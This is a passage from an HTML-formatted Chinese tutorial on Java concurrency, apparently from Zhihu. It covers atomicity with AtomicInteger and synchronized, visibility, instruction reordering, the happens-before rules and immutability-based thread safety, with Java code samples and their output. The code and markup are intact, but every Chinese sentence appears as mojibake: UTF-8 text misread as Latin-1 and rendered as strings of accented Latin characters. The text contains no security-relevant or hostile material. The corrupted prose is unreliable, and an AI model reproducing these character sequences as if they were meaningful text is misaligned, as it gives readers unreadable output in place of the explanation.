ä¾ç„¶å¯ä»¥è¯»å…¥æ—§å€¼ã€‚å¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸¤ä¸ªçº¿ç¨‹è™½ç„¶æ‰§è¡Œäº†ä¸¤æ¬¡è‡ªå¢è¿ç®—ï¼Œä½†æ˜¯ä¸»å†…å­˜ä¸­ cnt çš„å€¼æœ€åä¸º 1 è€Œä¸æ˜¯ 2ã€‚å› æ­¤å¯¹ int ç±»å‹è¯»å†™æ“ä½œæ»¡è¶³åŸå­æ€§åªæ˜¯è¯´æ˜ loadã€assignã€store è¿™äº›å•ä¸ªæ“ä½œå…·å¤‡åŸå­æ€§ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-cda140e15c3bc31a72e9a97889b18471_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"482\" data-rawheight=\"484\" class=\"origin_image zh-lightbox-thumb\" width=\"482\" data-original=\"https://pic2.zhimg.com/v2-cda140e15c3bc31a72e9a97889b18471_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;482&#39; height=&#39;484&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"482\" data-rawheight=\"484\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"482\" data-original=\"https://pic2.zhimg.com/v2-cda140e15c3bc31a72e9a97889b18471_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-cda140e15c3bc31a72e9a97889b18471_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>AtomicInteger èƒ½ä¿è¯å¤šä¸ªçº¿ç¨‹ä¿®æ”¹çš„åŸå­æ€§ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-6cda5aacfb318f058b60413ffa3cb617_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"475\" data-rawheight=\"724\" class=\"origin_image zh-lightbox-thumb\" width=\"475\" data-original=\"https://pic4.zhimg.com/v2-6cda5aacfb318f058b60413ffa3cb617_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;475&#39; height=&#39;724&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"475\" data-rawheight=\"724\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"475\" data-original=\"https://pic4.zhimg.com/v2-6cda5aacfb318f058b60413ffa3cb617_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-6cda5aacfb318f058b60413ffa3cb617_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>ä½¿ç”¨ AtomicInteger é‡å†™ä¹‹å‰çº¿ç¨‹ä¸å®‰å…¨çš„ä»£ç ä¹‹åå¾—åˆ°ä»¥ä¸‹çº¿ç¨‹å®‰å…¨å®ç°ï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AtomicExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"n\">AtomicInteger</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">AtomicInteger</span><span class=\"o\">();</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">add</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">cnt</span><span class=\"o\">.</span><span class=\"na\">incrementAndGet</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">cnt</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">threadSize</span> <span class=\"o\">=</span> <span class=\"n\">1000</span><span class=\"o\">;</span>\n    <span class=\"n\">AtomicExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">AtomicExample</span><span class=\"o\">();</span> <span class=\"c1\">// åªä¿®æ”¹è¿™æ¡è¯­å¥\n</span><span class=\"c1\"></span>    <span class=\"kd\">final</span> <span class=\"n\">CountDownLatch</span> <span class=\"n\">countDownLatch</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CountDownLatch</span><span class=\"o\">(</span><span class=\"n\">threadSize</span><span class=\"o\">);</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">threadSize</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n            <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">();</span>\n            <span class=\"n\">countDownLatch</span><span class=\"o\">.</span><span class=\"na\">countDown</span><span class=\"o\">();</span>\n        <span class=\"o\">});</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">countDownLatch</span><span class=\"o\">.</span><span class=\"na\">await</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdown</span><span class=\"o\">();</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">1000</span></code></pre></div><p>é™¤äº†ä½¿ç”¨åŸå­ç±»ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ synchronized äº’æ–¥é”æ¥ä¿è¯æ“ä½œçš„åŸå­æ€§ã€‚å®ƒå¯¹åº”çš„å†…å­˜é—´äº¤äº’æ“ä½œä¸ºï¼šlock å’Œ unlockï¼Œåœ¨è™šæ‹Ÿæœºå®ç°ä¸Šå¯¹åº”çš„å­—èŠ‚ç æŒ‡ä»¤ä¸º monitorenter å’Œ monitorexitã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">AtomicSynchronizedExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">cnt</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">synchronized</span> <span class=\"kt\">void</span> <span class=\"nf\">add</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">cnt</span><span class=\"o\">++;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">synchronized</span> <span class=\"kt\">int</span> <span class=\"nf\">get</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">cnt</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span> <span class=\"o\">{</span>\n    <span class=\"kd\">final</span> <span class=\"kt\">int</span> <span class=\"n\">threadSize</span> <span class=\"o\">=</span> <span class=\"n\">1000</span><span class=\"o\">;</span>\n    <span class=\"n\">AtomicSynchronizedExample</span> <span class=\"n\">example</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">AtomicSynchronizedExample</span><span class=\"o\">();</span>\n    <span class=\"kd\">final</span> <span class=\"n\">CountDownLatch</span> <span class=\"n\">countDownLatch</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">CountDownLatch</span><span class=\"o\">(</span><span class=\"n\">threadSize</span><span class=\"o\">);</span>\n    <span class=\"n\">ExecutorService</span> <span class=\"n\">executorService</span> <span class=\"o\">=</span> <span class=\"n\">Executors</span><span class=\"o\">.</span><span class=\"na\">newCachedThreadPool</span><span class=\"o\">();</span>\n    <span class=\"k\">for</span> <span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">i</span> <span class=\"o\">=</span> <span class=\"n\">0</span><span class=\"o\">;</span> <span class=\"n\">i</span> <span class=\"o\">&lt;</span> <span class=\"n\">threadSize</span><span class=\"o\">;</span> <span class=\"n\">i</span><span class=\"o\">++)</span> <span class=\"o\">{</span>\n        <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">execute</span><span class=\"o\">(()</span> <span class=\"o\">-&gt;</span> <span class=\"o\">{</span>\n            <span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">();</span>\n            <span class=\"n\">countDownLatch</span><span class=\"o\">.</span><span class=\"na\">countDown</span><span class=\"o\">();</span>\n        <span class=\"o\">});</span>\n    <span class=\"o\">}</span>\n    <span class=\"n\">countDownLatch</span><span class=\"o\">.</span><span class=\"na\">await</span><span class=\"o\">();</span>\n    <span class=\"n\">executorService</span><span class=\"o\">.</span><span class=\"na\">shutdown</span><span class=\"o\">();</span>\n    <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">example</span><span class=\"o\">.</span><span class=\"na\">get</span><span class=\"o\">());</span>\n<span class=\"o\">}</span>\n<span class=\"n\">1000</span></code></pre></div><h3>2. å¯è§æ€§</h3><p>å¯è§æ€§æŒ‡å½“ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†å…±äº«å˜é‡çš„å€¼ï¼Œå…¶å®ƒçº¿ç¨‹èƒ½å¤Ÿç«‹å³å¾—çŸ¥è¿™ä¸ªä¿®æ”¹ã€‚Java å†…å­˜æ¨¡å‹æ˜¯é€šè¿‡åœ¨å˜é‡ä¿®æ”¹åå°†æ–°å€¼åŒæ­¥å›ä¸»å†…å­˜ï¼Œåœ¨å˜é‡è¯»å–å‰ä»ä¸»å†…å­˜åˆ·æ–°å˜é‡å€¼æ¥å®ç°å¯è§æ€§çš„ã€‚</p><p>ä¸»è¦æœ‰ä¸‰ç§å®ç°å¯è§æ€§çš„æ–¹å¼ï¼š</p><ul><li>volatile</li><li>synchronizedï¼Œå¯¹ä¸€ä¸ªå˜é‡æ‰§è¡Œ unlock æ“ä½œä¹‹å‰ï¼Œå¿…é¡»æŠŠå˜é‡å€¼åŒæ­¥å›ä¸»å†…å­˜ã€‚</li><li>finalï¼Œè¢« final å…³é”®å­—ä¿®é¥°çš„å­—æ®µåœ¨æ„é€ å™¨ä¸­ä¸€æ—¦åˆå§‹åŒ–å®Œæˆï¼Œå¹¶ä¸”æ²¡æœ‰å‘ç”Ÿ this é€ƒé€¸ï¼ˆå…¶å®ƒçº¿ç¨‹é€šè¿‡ this å¼•ç”¨è®¿é—®åˆ°åˆå§‹åŒ–äº†ä¸€åŠçš„å¯¹è±¡ï¼‰ï¼Œé‚£ä¹ˆå…¶å®ƒçº¿ç¨‹å°±èƒ½çœ‹è§ final å­—æ®µçš„å€¼ã€‚</li></ul><p>å¯¹å‰é¢çš„çº¿ç¨‹ä¸å®‰å…¨ç¤ºä¾‹ä¸­çš„ cnt å˜é‡ä½¿ç”¨ volatile ä¿®é¥°ï¼Œä¸èƒ½è§£å†³çº¿ç¨‹ä¸å®‰å…¨é—®é¢˜ï¼Œå› ä¸º volatile å¹¶ä¸èƒ½ä¿è¯æ“ä½œçš„åŸå­æ€§ã€‚</p><h3>3. æœ‰åºæ€§</h3><p>æœ‰åºæ€§æ˜¯æŒ‡ï¼šåœ¨æœ¬çº¿ç¨‹å†…è§‚å¯Ÿï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯æœ‰åºçš„ã€‚åœ¨ä¸€ä¸ªçº¿ç¨‹è§‚å¯Ÿå¦ä¸€ä¸ªçº¿ç¨‹ï¼Œæ‰€æœ‰æ“ä½œéƒ½æ˜¯æ— åºçš„ï¼Œæ— åºæ˜¯å› ä¸ºå‘ç”Ÿäº†æŒ‡ä»¤é‡æ’åºã€‚åœ¨ Java å†…å­˜æ¨¡å‹ä¸­ï¼Œå…è®¸ç¼–è¯‘å™¨å’Œå¤„ç†å™¨å¯¹æŒ‡ä»¤è¿›è¡Œé‡æ’åºï¼Œé‡æ’åºè¿‡ç¨‹ä¸ä¼šå½±å“åˆ°å•çº¿ç¨‹ç¨‹åºçš„æ‰§è¡Œï¼Œå´ä¼šå½±å“åˆ°å¤šçº¿ç¨‹å¹¶å‘æ‰§è¡Œçš„æ­£ç¡®æ€§ã€‚</p><p>volatile å…³é”®å­—é€šè¿‡æ·»åŠ å†…å­˜å±éšœçš„æ–¹å¼æ¥ç¦æ­¢æŒ‡ä»¤é‡æ’ï¼Œå³é‡æ’åºæ—¶ä¸èƒ½æŠŠåé¢çš„æŒ‡ä»¤æ”¾åˆ°å†…å­˜å±éšœä¹‹å‰ã€‚</p><p>ä¹Ÿå¯ä»¥é€šè¿‡ synchronized æ¥ä¿è¯æœ‰åºæ€§ï¼Œå®ƒä¿è¯æ¯ä¸ªæ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹æ‰§è¡ŒåŒæ­¥ä»£ç ï¼Œç›¸å½“äºæ˜¯è®©çº¿ç¨‹é¡ºåºæ‰§è¡ŒåŒæ­¥ä»£ç ã€‚</p><h2>å…ˆè¡Œå‘ç”ŸåŸåˆ™</h2><p>ä¸Šé¢æåˆ°äº†å¯ä»¥ç”¨ volatile å’Œ synchronized æ¥ä¿è¯æœ‰åºæ€§ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒJVM è¿˜è§„å®šäº†å…ˆè¡Œå‘ç”ŸåŸåˆ™ï¼Œè®©ä¸€ä¸ªæ“ä½œæ— éœ€æ§åˆ¶å°±èƒ½å…ˆäºå¦ä¸€ä¸ªæ“ä½œå®Œæˆã€‚</p><h3>1. å•ä¸€çº¿ç¨‹åŸåˆ™</h3><blockquote> Single Thread rule<br/> </blockquote><p>åœ¨ä¸€ä¸ªçº¿ç¨‹å†…ï¼Œåœ¨ç¨‹åºå‰é¢çš„æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢çš„æ“ä½œã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-f0dbfb4af5360d64a8899ba85e0f6204_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"417\" class=\"content_image\" width=\"280\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;280&#39; height=&#39;417&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"280\" data-rawheight=\"417\" class=\"content_image lazy\" width=\"280\" data-actualsrc=\"https://pic1.zhimg.com/v2-f0dbfb4af5360d64a8899ba85e0f6204_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. ç®¡ç¨‹é”å®šè§„åˆ™</h3><blockquote> Monitor Lock Rule<br/> </blockquote><p>ä¸€ä¸ª unlock æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹åŒä¸€ä¸ªé”çš„ lock æ“ä½œã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-fa3d063cb9699fa357de03acee03389d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"563\" data-rawheight=\"343\" class=\"origin_image zh-lightbox-thumb\" width=\"563\" data-original=\"https://pic2.zhimg.com/v2-fa3d063cb9699fa357de03acee03389d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;563&#39; height=&#39;343&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"563\" data-rawheight=\"343\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"563\" data-original=\"https://pic2.zhimg.com/v2-fa3d063cb9699fa357de03acee03389d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-fa3d063cb9699fa357de03acee03389d_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>3. volatile å˜é‡è§„åˆ™</h3><blockquote> Volatile Variable Rule<br/> </blockquote><p>å¯¹ä¸€ä¸ª volatile å˜é‡çš„å†™æ“ä½œå…ˆè¡Œå‘ç”Ÿäºåé¢å¯¹è¿™ä¸ªå˜é‡çš„è¯»æ“ä½œã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-d72842da9887a0e9658b1ded49fb5b3e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"410\" class=\"origin_image zh-lightbox-thumb\" width=\"670\" data-original=\"https://pic3.zhimg.com/v2-d72842da9887a0e9658b1ded49fb5b3e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;670&#39; height=&#39;410&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"670\" data-rawheight=\"410\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"670\" data-original=\"https://pic3.zhimg.com/v2-d72842da9887a0e9658b1ded49fb5b3e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-d72842da9887a0e9658b1ded49fb5b3e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>4. çº¿ç¨‹å¯åŠ¨è§„åˆ™</h3><blockquote> Thread Start Rule<br/> </blockquote><p>Thread å¯¹è±¡çš„ start() æ–¹æ³•è°ƒç”¨å…ˆè¡Œå‘ç”Ÿäºæ­¤çº¿ç¨‹çš„æ¯ä¸€ä¸ªåŠ¨ä½œã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-4a32e3f735a6c830002344b097284f6e_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"655\" data-rawheight=\"317\" class=\"origin_image zh-lightbox-thumb\" width=\"655\" data-original=\"https://pic3.zhimg.com/v2-4a32e3f735a6c830002344b097284f6e_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;655&#39; height=&#39;317&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"655\" data-rawheight=\"317\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"655\" data-original=\"https://pic3.zhimg.com/v2-4a32e3f735a6c830002344b097284f6e_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-4a32e3f735a6c830002344b097284f6e_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>5. çº¿ç¨‹åŠ å…¥è§„åˆ™</h3><blockquote> Thread Join Rule<br/> </blockquote><p>Thread å¯¹è±¡çš„ç»“æŸå…ˆè¡Œå‘ç”Ÿäº join() æ–¹æ³•è¿”å›ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-12caec6922872ff0256c0202de583a0a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"319\" class=\"origin_image zh-lightbox-thumb\" width=\"660\" data-original=\"https://pic3.zhimg.com/v2-12caec6922872ff0256c0202de583a0a_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;660&#39; height=&#39;319&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"660\" data-rawheight=\"319\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"660\" data-original=\"https://pic3.zhimg.com/v2-12caec6922872ff0256c0202de583a0a_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-12caec6922872ff0256c0202de583a0a_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>6. çº¿ç¨‹ä¸­æ–­è§„åˆ™</h3><blockquote> Thread Interruption Rule<br/> </blockquote><p>å¯¹çº¿ç¨‹ interrupt() æ–¹æ³•çš„è°ƒç”¨å…ˆè¡Œå‘ç”Ÿäºè¢«ä¸­æ–­çº¿ç¨‹çš„ä»£ç æ£€æµ‹åˆ°ä¸­æ–­äº‹ä»¶çš„å‘ç”Ÿï¼Œå¯ä»¥é€šè¿‡ interrupted() æ–¹æ³•æ£€æµ‹åˆ°æ˜¯å¦æœ‰ä¸­æ–­å‘ç”Ÿã€‚</p><h3>7. å¯¹è±¡ç»ˆç»“è§„åˆ™</h3><blockquote> Finalizer Rule<br/> </blockquote><p>ä¸€ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–å®Œæˆï¼ˆæ„é€ å‡½æ•°æ‰§è¡Œç»“æŸï¼‰å…ˆè¡Œå‘ç”Ÿäºå®ƒçš„ finalize() æ–¹æ³•çš„å¼€å§‹ã€‚</p><h3>8. ä¼ é€’æ€§</h3><blockquote> Transitivity<br/> </blockquote><p>å¦‚æœæ“ä½œ A å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Bï¼Œæ“ä½œ B å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Cï¼Œé‚£ä¹ˆæ“ä½œ A å…ˆè¡Œå‘ç”Ÿäºæ“ä½œ Cã€‚</p><h2>åä¸€ã€çº¿ç¨‹å®‰å…¨</h2><p>å¤šä¸ªçº¿ç¨‹ä¸ç®¡ä»¥ä½•ç§æ–¹å¼è®¿é—®æŸä¸ªç±»ï¼Œå¹¶ä¸”åœ¨ä¸»è°ƒä»£ç ä¸­ä¸éœ€è¦è¿›è¡ŒåŒæ­¥ï¼Œéƒ½èƒ½è¡¨ç°æ­£ç¡®çš„è¡Œä¸ºã€‚</p><p>çº¿ç¨‹å®‰å…¨æœ‰ä»¥ä¸‹å‡ ç§å®ç°æ–¹å¼ï¼š</p><h2>ä¸å¯å˜</h2><p>ä¸å¯å˜ï¼ˆImmutableï¼‰çš„å¯¹è±¡ä¸€å®šæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œä¸éœ€è¦å†é‡‡å–ä»»ä½•çš„çº¿ç¨‹å®‰å…¨ä¿éšœæªæ–½ã€‚åªè¦ä¸€ä¸ªä¸å¯å˜çš„å¯¹è±¡è¢«æ­£ç¡®åœ°æ„å»ºå‡ºæ¥ï¼Œæ°¸è¿œä¹Ÿä¸ä¼šçœ‹åˆ°å®ƒåœ¨å¤šä¸ªçº¿ç¨‹ä¹‹ä¸­å¤„äºä¸ä¸€è‡´çš„çŠ¶æ€ã€‚å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ï¼Œåº”å½“å°½é‡ä½¿å¯¹è±¡æˆä¸ºä¸å¯å˜ï¼Œæ¥æ»¡è¶³çº¿ç¨‹å®‰å…¨ã€‚</p><p>ä¸å¯å˜çš„ç±»å‹ï¼š</p><ul><li>final å…³é”®å­—ä¿®é¥°çš„åŸºæœ¬æ•°æ®ç±»å‹</li><li>String</li><li>æšä¸¾ç±»å‹</li><li>Number éƒ¨åˆ†å­ç±»ï¼Œå¦‚ Long å’Œ Double ç­‰æ•°å€¼åŒ…è£…ç±»å‹ï¼ŒBigInteger å’Œ BigDecimal ç­‰å¤§æ•°æ®ç±»å‹ã€‚ä½†åŒä¸º Number çš„åŸå­ç±» AtomicInteger å’Œ AtomicLong åˆ™æ˜¯å¯å˜çš„ã€‚</li></ul><p>å¯¹äºé›†åˆç±»å‹ï¼Œå¯ä»¥ä½¿ç”¨ Collections.unmodifiableXXX() æ–¹æ³•æ¥è·å–ä¸€ä¸ªä¸å¯å˜çš„é›†åˆã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">ImmutableExample</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Map</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">,</span> <span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">map</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">HashMap</span><span class=\"o\">&lt;&gt;();</span>\n        <span class=\"n\">Map</span><span class=\"o\">&lt;</span><span class=\"n\">String</span><span class=\"o\">,</span> <span class=\"n\">Integer</span><span class=\"o\">&gt;</span> <span class=\"n\">unmodifiableMap</span> <span class=\"o\">=</span> <span class=\"n\">Collections</span><span class=\"o\">.</span><span class=\"na\">unmodifiableMap</span><span class=\"o\">(</span><span class=\"n\">map</span><span class=\"o\">);</span>\n        <span class=\"n\">unmodifiableMap</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"s\">&#34;a&#34;</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">Exception</span> <span class=\"n\">in</span> <span class=\"n\">thread</span> <span class=\"s\">&#34;main&#34;</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">lang</span><span class=\"o\">.</span><span class=\"na\">UnsupportedOperationException</span>\n    <span class=\"n\">at</span> <span class=\"n\">java</span><span class=\"o\">.</span><span class=\"na\">util</span><span class=\"o\">.</span><span class=\"na\">Collections$UnmodifiableMap</span><span class=\"o\">.</span><span class=\"na\">put</span><span class=\"o\">(</span><span class=\"n\">Collections</span><span class=\"o\">.</span><span class=\"na\">java</span><span class=\"o\">:</span><span class=\"n\">1457</span><span class=\"o\">)</span>\n    <span class=\"n\">at</span> <span class=\"n\">ImmutableExample</span><span class=\"o\">.</span><span class=\"na\">main</span><span class=\"o\">(</span><span class=\"n\">ImmutableExample</span><span class=\"o\">.</span><span class=\"na\">java</span><span class=\"o\">:</span><span class=\"n\">9</span><span class=\"o\">)</span></code></pre></div><p>Collections.unmodifiableXXX() å…ˆå¯¹åŸå§‹çš„é›†åˆè¿›è¡Œæ‹·è´ï¼Œéœ€è¦å¯¹é›†åˆè¿›è¡Œä¿®æ”¹çš„æ–¹æ³•éƒ½ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"n\">V</span> <span class=\"nf\">put</span><span class=\"o\">(</span><span class=\"n\">K</span> <span class=\"n\">key</span><span class=\"o\">,</span> <span class=\"n\">V</span> <span class=\"n\">value</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n    <span class=\"k\">throw</span> <span class=\"k\">new</span> <span class=\"n\">UnsupportedOperationException</span><span class=\"o\">();</span>\n<span class=\"o\">}</span></code></pre></div><h2>äº’æ–¥åŒæ­¥</h2><p>synchronized å’Œ ReentrantLockã€‚</p><h2>éé˜»å¡åŒæ­¥</h2><p>äº’æ–¥åŒæ­¥æœ€ä¸»è¦çš„é—®é¢˜å°±æ˜¯çº¿ç¨‹é˜»å¡å’Œå”¤é†’æ‰€å¸¦æ¥çš„æ€§èƒ½é—®é¢˜ï¼Œå› æ­¤è¿™ç§åŒæ­¥ä¹Ÿç§°ä¸ºé˜»å¡åŒæ­¥ã€‚</p><p>äº’æ–¥åŒæ­¥å±äºä¸€ç§æ‚²è§‚çš„å¹¶å‘ç­–ç•¥ï¼Œæ€»æ˜¯è®¤ä¸ºåªè¦ä¸å»åšæ­£ç¡®çš„åŒæ­¥æªæ–½ï¼Œé‚£å°±è‚¯å®šä¼šå‡ºç°é—®é¢˜ã€‚æ— è®ºå…±äº«æ•°æ®æ˜¯å¦çœŸçš„ä¼šå‡ºç°ç«äº‰ï¼Œå®ƒéƒ½è¦è¿›è¡ŒåŠ é”ï¼ˆè¿™é‡Œè®¨è®ºçš„æ˜¯æ¦‚å¿µæ¨¡å‹ï¼Œå®é™…ä¸Šè™šæ‹Ÿæœºä¼šä¼˜åŒ–æ‰å¾ˆå¤§ä¸€éƒ¨åˆ†ä¸å¿…è¦çš„åŠ é”ï¼‰ã€ç”¨æˆ·æ€æ 